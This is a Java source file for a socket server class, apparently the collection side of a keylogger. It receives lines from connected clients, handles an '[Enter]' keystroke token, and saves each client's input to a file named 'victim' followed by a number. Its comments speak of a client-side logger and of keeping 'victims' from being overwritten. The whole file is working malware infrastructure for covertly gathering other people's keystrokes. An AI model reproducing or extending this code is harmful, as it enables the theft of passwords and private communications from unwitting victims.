package Server;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Objects;

public class ClientHandler implements Runnable {

    protected static ArrayList<ClientHandler> clientHandlers = new ArrayList<>();
    protected Socket socket;
    protected BufferedReader bufferedReader;
    protected BufferedWriter bufferedWriter;
    public ClientHandler(Socket socket) {
        try {
            this.socket = socket;
            this.bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            this.bufferedWriter = new BufferedWriter(new FileWriter("victim" + clientHandlers.size()+ ".txt"));
            clientHandlers.add(this);
        } catch (IOException e) {
            close(socket, bufferedReader);
        }
    }

    @Override
    public void run() {
        while(socket.isConnected()) {
            try {
                String message = bufferedReader.readLine();

                if(Objects.equals(message, "[Enter]")) //This can't be done Logger.Client-side as the
                    message += "\n";                     //message is received on \n

                WriteMessage(message);
            } catch (IOException e) {
                close(socket, bufferedReader);
                break;
            }
        }
    }

    public void WriteMessage(String message) {
        System.out.println(message);
        try {
            bufferedWriter.write(message);
            bufferedWriter.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    protected void removeClientHandler() {
        //clientHandlers.remove(this); //Esto está quitado ya que sobreescribiría victimas si una se desconecta
    }

    protected void close(Socket socket, BufferedReader bufferedReader) {
        removeClientHandler();
        try {
            if(bufferedReader != null)
                bufferedReader.close();
            if(socket != null)
                socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
